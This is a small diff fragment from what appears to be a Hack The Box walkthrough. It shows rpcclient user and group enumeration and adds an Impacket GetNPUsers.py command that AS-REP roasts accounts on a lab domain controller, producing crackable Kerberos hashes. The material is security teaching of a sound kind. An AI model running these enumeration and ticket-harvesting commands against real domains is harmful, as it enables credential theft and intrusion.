@@ -91,3 +91,5 @@ rpcclient $> querygroupmem 0x200
 rpcclient $> queryuser 0x1f4            
 ```  
 ```
+GetNPUsers.py -format john -no-pass -k -usersfile users -dc-ip 10.10.10.161 HTB.LOCAL/
+```
